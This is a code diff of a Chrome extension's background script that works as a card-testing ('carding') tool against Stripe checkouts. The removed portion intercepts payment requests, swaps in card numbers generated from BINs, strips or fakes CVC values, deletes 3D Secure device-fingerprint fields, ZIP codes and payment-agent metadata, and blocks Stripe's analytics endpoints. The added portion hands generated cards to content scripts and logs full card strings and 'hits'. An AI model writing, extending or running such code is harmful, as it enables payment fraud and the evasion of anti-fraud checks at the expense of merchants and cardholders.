@@ -197,261 +197,22 @@ chrome.action.onClicked.addListener(async () => {
   }
 });
 
-// ==================== WEBREQUEST API INTERCEPTION ====================
+// ==================== NOTE ====================
+// Manifest V3 WebRequest API cannot modify request bodies
+// Request modification is handled by content scripts (form-injector.js)
+// Background script handles state management and logging only
 
-// URLs to intercept
-const STRIPE_PATTERNS = [
-  '*://api.stripe.com/*',
-  '*://*.stripe.com/v1/*',
-  '*://js.stripe.com/*'
-];
+// ==================== HELPER FUNCTIONS FOR CONTENT SCRIPTS ====================
 
-// Blocked analytics URLs
-const ANALYTICS_PATTERNS = [
-  '*://r.stripe.com/*',
-  '*://m.stripe.com/*',
-  '*://q.stripe.com/*'
-];
+/**
+ * Generate card from BIN and log it
+ * Called by content scripts via message
+ */
+function generateAndLogCard(bin) {
+  if (!bin) return null;
 
-// Listen for requests before they're sent
-chrome.webRequest.onBeforeRequest.addListener(
-  (details) => {
-    // Block analytics if enabled
-    if (state.settings.blockAnalytics) {
-      for (const pattern of ANALYTICS_PATTERNS) {
-        if (matchesPattern(details.url, pattern)) {
-          console.log('[WebRequest] Blocked analytics:', details.url);
-          return { cancel: true };
-        }
-      }
-    }
-
-    // Only process POST requests with body
-    if (details.method !== 'POST' || !details.requestBody) {
-      return {};
-    }
-
-    // Check if it's a Stripe payment request
-    if (!isStripePaymentRequest(details.url)) {
-      return {};
-    }
-
-    // Get the request body
-    const body = getRequestBody(details.requestBody);
-    if (!body) return {};
-
-    // Detect checkout type (2D or 3D)
-    const is3ds = detect3dsRequest(body);
-    if (is3ds && !state.is3dsDetectedTabs.has(details.tabId)) {
-      state.is3dsDetectedTabs.add(details.tabId);
-      notifyTab(details.tabId, {
-        type: 'SHOW_3DS_NOTIFICATION',
-        message: '🔒 3D Secure Detected'
-      });
-      addLog({ type: 'warning', message: '🔒 3D Secure checkout detected', timestamp: Date.now() });
-    }
-
-    // Process and modify the request
-    const processed = processPaymentRequest(body, details.url, details.tabId);
-    
-    if (processed.modified) {
-      addLog({ 
-        type: 'info', 
-        message: `🔧 Modified request: ${processed.info.action}`, 
-        timestamp: Date.now() 
-      });
-      
-      // Return modified form data
-      return {
-        requestBody: {
-          formData: processed.formData
-        }
-      };
-    }
-
-    return {};
-  },
-  { urls: ['<all_urls>'] },
-  ['blocking', 'requestBody']
-);
-
-// Listen for response headers to detect Stripe
-chrome.webRequest.onHeadersReceived.addListener(
-  (details) => {
-    // Detect Stripe checkout pages
-    if (details.url.includes('checkout.stripe.com') || 
-        details.url.includes('buy.stripe.com') ||
-        details.url.includes('invoice.stripe.com')) {
-      
-      if (!state.checkoutDetectedTabs.has(details.tabId)) {
-        state.checkoutDetectedTabs.add(details.tabId);
-        
-        // Send notification to content script
-        setTimeout(() => {
-          notifyTab(details.tabId, {
-            type: 'SHOW_STRIPE_CHECKOUT_NOTIFICATION'
-          });
-        }, 1000);
-        
-        addLog({ type: 'success', message: '🔍 Stripe Checkout Detected', timestamp: Date.now() });
-      }
-    }
-    
-    return {};
-  },
-  { urls: ['<all_urls>'] },
-  ['responseHeaders']
-);
-
-// ==================== REQUEST PROCESSING ====================
-
-function isStripePaymentRequest(url) {
-  return url.includes('stripe.com/v1/payment_methods') ||
-         url.includes('stripe.com/v1/tokens') ||
-         url.includes('stripe.com/v1/sources') ||
-         url.includes('stripe.com/v1/payment_intents') && url.includes('confirm');
-}
-
-function getRequestBody(requestBody) {
-  if (!requestBody) return null;
-  
-  if (requestBody.formData) {
-    // Convert formData object to URLSearchParams string
-    const params = new URLSearchParams();
-    for (const [key, values] of Object.entries(requestBody.formData)) {
-      for (const value of values) {
-        params.append(key, value);
-      }
-    }
-    return params.toString();
-  }
-  
-  if (requestBody.raw && requestBody.raw.length > 0) {
-    const decoder = new TextDecoder('utf-8');
-    let body = '';
-    for (const part of requestBody.raw) {
-      body += decoder.decode(part.bytes);
-    }
-    return body;
-  }
-  
-  return null;
-}
-
-function detect3dsRequest(body) {
-  return body.includes('three_d_secure') || 
-         body.includes('3ds') || 
-         body.includes('authenticate');
-}
-
-function processPaymentRequest(body, url, tabId) {
-  const params = new URLSearchParams(body);
-  let modified = false;
-  let info = { action: [] };
-
-  // === CARD SUBSTITUTION (when Bypass is active and BIN is set) ===
-  if (state.bypassActive && state.binList.length > 0) {
-    const result = substituteCard(params, tabId);
-    if (result.modified) {
-      modified = true;
-      info.action.push(`Card: ${result.maskedCard}`);
-    }
-  }
-
-  // === CVC MODIFICATION ===
-  const cvcResult = modifyCvc(params);
-  if (cvcResult.modified) {
-    modified = true;
-    info.action.push(`CVC: ${cvcResult.action}`);
-  }
-
-  // === 3D SECURE FINGERPRINT BYPASS ===
-  if (state.settings.remove3dsFingerprint) {
-    const threeDsResult = bypass3dsFingerprint(params);
-    if (threeDsResult.modified) {
-      modified = true;
-      info.action.push('3DS fingerprint removed');
-    }
-  }
-
-  // === REMOVE PAYMENT AGENT ===
-  if (state.settings.removePaymentAgent) {
-    const agentResult = removePaymentAgent(params);
-    if (agentResult.modified) {
-      modified = true;
-      info.action.push('Agent removed');
-    }
-  }
-
-  // === REMOVE ZIP CODE ===
-  if (state.settings.removeZipCode) {
-    const zipResult = removeZipCode(params);
-    if (zipResult.modified) {
-      modified = true;
-      info.action.push('ZIP removed');
-    }
-  }
-
-  // Convert URLSearchParams back to formData format
-  const formData = {};
-  for (const [key, value] of params) {
-    if (!formData[key]) formData[key] = [];
-    formData[key].push(value);
-  }
-
-  info.action = info.action.join(', ') || 'none';
-  return { modified, formData, info };
-}
-
-function substituteCard(params, tabId) {
-  // Check if card data exists
-  const hasCard = params.has('card[number]') || 
-                  params.has('payment_method_data[card][number]');
-  
-  if (!hasCard) return { modified: false };
-
-  // Get BIN and generate card
-  const bin = state.binList[state.currentBinIndex % state.binList.length];
-  if (!bin) return { modified: false };
-
-  // Generate card from BIN
   const card = CardGen.generateFromBin(bin);
-  if (!card) return { modified: false };
-
-  // Store generated card for this transaction
-  state.generatedCard = card;
-  
-  // Track card for this tab
-  const tabInfo = tabState.get(tabId) || { tested: 0 };
-  tabInfo.currentCard = card;
-  tabInfo.tested++;
-  tabState.set(tabId, tabInfo);
-
-  // Update stats
-  state.stats.tested++;
-  chrome.storage.local.set({ stats: state.stats });
-
-  // Replace card number
-  if (params.has('card[number]')) {
-    params.set('card[number]', card.number);
-  }
-  if (params.has('payment_method_data[card][number]')) {
-    params.set('payment_method_data[card][number]', card.number);
-  }
-
-  // Replace expiry
-  if (params.has('card[exp_month]')) {
-    params.set('card[exp_month]', card.month);
-  }
-  if (params.has('card[exp_year]')) {
-    params.set('card[exp_year]', card.year);
-  }
-  if (params.has('payment_method_data[card][exp_month]')) {
-    params.set('payment_method_data[card][exp_month]', card.month);
-  }
-  if (params.has('payment_method_data[card][exp_year]')) {
-    params.set('payment_method_data[card][exp_year]', card.year);
-  }
+  if (!card) return null;
 
   // Get CVC modifier name for logging
   const cvcModifierNames = {
@@ -470,143 +231,21 @@ function substituteCard(params, tabId) {
     timestamp: Date.now() 
   });
 
-  return { modified: true, maskedCard: Formatters.maskCardNumber(card.number), fullCard };
+  state.generatedCard = card;
+  state.stats.tested++;
+  chrome.storage.local.set({ stats: state.stats });
+
+  return card;
 }
 
-function modifyCvc(params) {
-  const cvcKeys = ['card[cvc]', 'payment_method_data[card][cvc]', 'source[card][cvc]'];
-  let modified = false;
-  let action = '';
-
-  for (const key of cvcKeys) {
-    if (params.has(key)) {
-      switch (state.settings.cvcModifier) {
-        case 'remove':
-          params.delete(key);
-          action = 'removed';
-          modified = true;
-          break;
-
-        case 'generate':
-          const newCvc = state.generatedCard?.cvv || CardGen.genRandomCvv();
-          params.set(key, newCvc);
-          action = `generated (${newCvc})`;
-          modified = true;
-          break;
-
-        case 'custom':
-          if (state.settings.customCvc) {
-            params.set(key, state.settings.customCvc);
-            action = `custom (${state.settings.customCvc})`;
-            modified = true;
-          }
-          break;
-
-        case 'nothing':
-        default:
-          action = 'unchanged';
-          break;
-      }
-    }
-  }
-
-  return { modified, action };
-}
-
-function bypass3dsFingerprint(params) {
-  // Look for three_d_secure[device_data]
-  let deviceDataKey = null;
-  let deviceDataValue = null;
-
-  for (const [key, value] of params) {
-    if (key.includes('three_d_secure') && key.includes('device_data')) {
-      deviceDataKey = key;
-      deviceDataValue = value;
-      break;
-    }
-  }
-
-  if (!deviceDataKey || !deviceDataValue) {
-    return { modified: false };
-  }
-
-  try {
-    // Decode: URL decode -> Base64 decode -> JSON parse
-    let decoded = decodeURIComponent(deviceDataValue);
-    let jsonStr = atob(decoded);
-    let obj = JSON.parse(jsonStr);
-
-    // Remove fingerprint fields
-    delete obj.browser_locale;
-    delete obj.timezone;
-    delete obj.user_agent;
-    delete obj.screen_width;
-    delete obj.screen_height;
-    delete obj.color_depth;
-    delete obj.language;
-    delete obj.java_enabled;
-    delete obj.javascript_enabled;
-    delete obj.time_zone;
-
-    // Re-encode: JSON stringify -> Base64 encode -> URL encode
-    let newJson = JSON.stringify(obj);
-    let newBase64 = btoa(newJson);
-    let newEncoded = encodeURIComponent(newBase64);
-
-    params.set(deviceDataKey, newEncoded);
-    
-    console.log('[Background] 3DS fingerprint removed');
-    return { modified: true };
-  } catch (e) {
-    console.error('[Background] Failed to process 3DS data:', e);
-    return { modified: false };
-  }
-}
-
-function removePaymentAgent(params) {
-  const agentKeys = [
-    'payment_user_agent',
-    'referrer',
-    'client_attribution_metadata[client_session_id]',
-    'client_attribution_metadata[merchant_integration_source]',
-    'client_attribution_metadata[merchant_integration_subtype]',
-    'client_attribution_metadata[merchant_integration_version]'
-  ];
-
-  let modified = false;
-  for (const key of agentKeys) {
-    if (params.has(key)) {
-      params.delete(key);
-      modified = true;
-    }
-  }
-
-  return { modified };
-}
-
-function removeZipCode(params) {
-  const zipKeys = [
-    'billing_details[address][postal_code]',
-    'card[address_zip]',
-    'payment_method_data[billing_details][address][postal_code]'
-  ];
-
-  let modified = false;
-  for (const key of zipKeys) {
-    if (params.has(key)) {
-      params.delete(key);
-      modified = true;
-    }
-  }
-
-  return { modified };
-}
-
-function matchesPattern(url, pattern) {
-  const regexPattern = pattern
-    .replace(/\*/g, '.*')
-    .replace(/\?/g, '.');
-  return new RegExp(regexPattern).test(url);
+/**
+ * Get next BIN from list
+ */
+function getNextBin() {
+  if (state.binList.length === 0) return null;
+  const bin = state.binList[state.currentBinIndex % state.binList.length];
+  state.currentBinIndex++;
+  return bin;
 }
 
 // ==================== PERMISSION CHECKS ====================
@@ -695,12 +334,70 @@ async function handleMessage(message, sender, sendResponse) {
       break;
 
     case 'CHECKOUT_DETECTED':
-      handleCheckoutDetected(sender.tab?.id);
+      handleCheckoutDetected(sender.tab?.id, message.checkoutType);
       sendResponse({ success: true });
       break;
 
     case '3DS_DETECTED':
       handle3dsDetected(sender.tab?.id);
+      sendResponse({ success: true });
+      break;
+
+    case 'GET_CARD_FROM_BIN':
+      // Content script requesting a card from BIN
+      const bin = getNextBin();
+      if (bin) {
+        const card = generateAndLogCard(bin);
+        sendResponse({ success: true, card: card, settings: state.settings });
+      } else {
+        sendResponse({ success: false, error: 'No BIN available' });
+      }
+      break;
+
+    case 'LOG_CARD_USED':
+      // Content script logging a card it used
+      if (message.card) {
+        const cvcModifierNames = {
+          'remove': 'Remove',
+          'generate': 'Generate', 
+          'nothing': 'Nothing',
+          'custom': 'Custom'
+        };
+        const cvcModeName = cvcModifierNames[state.settings.cvcModifier] || state.settings.cvcModifier;
+        const fullCard = `${message.card.number}|${message.card.month}|${message.card.year}|${message.card.cvv}`;
+        addLog({ 
+          type: 'info', 
+          message: `💳 ${fullCard} (gen) [CVC: ${cvcModeName}]`, 
+          timestamp: Date.now() 
+        });
+        state.stats.tested++;
+        chrome.storage.local.set({ stats: state.stats });
+      }
+      sendResponse({ success: true });
+      break;
+
+    case 'LOG_GATEWAY_RESPONSE':
+      // Content script logging gateway response
+      if (message.response) {
+        const { gateway, status, code, message: msg } = message.response;
+        if (status === 'success') {
+          addLog({ type: 'success', message: `✅ ${gateway}: ${msg || 'Success'}`, timestamp: Date.now() });
+        } else {
+          addLog({ type: 'error', message: `❌ ${gateway}: ${code || msg || 'Declined'}`, timestamp: Date.now() });
+        }
+      }
+      sendResponse({ success: true });
+      break;
+
+    case 'LOG_HIT':
+      // Content script detected a hit
+      addLog({ type: 'success', message: `🎉 HIT DETECTED`, timestamp: Date.now() });
+      if (message.card) {
+        addLog({ type: 'success', message: `💎 ${message.card}`, timestamp: Date.now() });
+      }
+      state.stats.hits++;
+      chrome.storage.local.set({ stats: state.stats });
+      broadcastToPopup({ type: 'STATS_UPDATE', hits: state.stats.hits });
       sendResponse({ success: true });
       break;
 
@@ -899,10 +596,11 @@ function handleSuccessDetected(url, tabId) {
   handleSuccess(tabId, state.generatedCard);
 }
 
-function handleCheckoutDetected(tabId) {
+function handleCheckoutDetected(tabId, checkoutType = '2d') {
   if (!state.checkoutDetectedTabs.has(tabId)) {
     state.checkoutDetectedTabs.add(tabId);
-    addLog({ type: 'info', message: '🔍 Stripe Checkout Detected', timestamp: Date.now() });
+    const typeLabel = checkoutType === '3d' ? '3D' : '2D';
+    addLog({ type: 'info', message: `🔍 ${typeLabel} Checkout Detected`, timestamp: Date.now() });
   }
 }
 
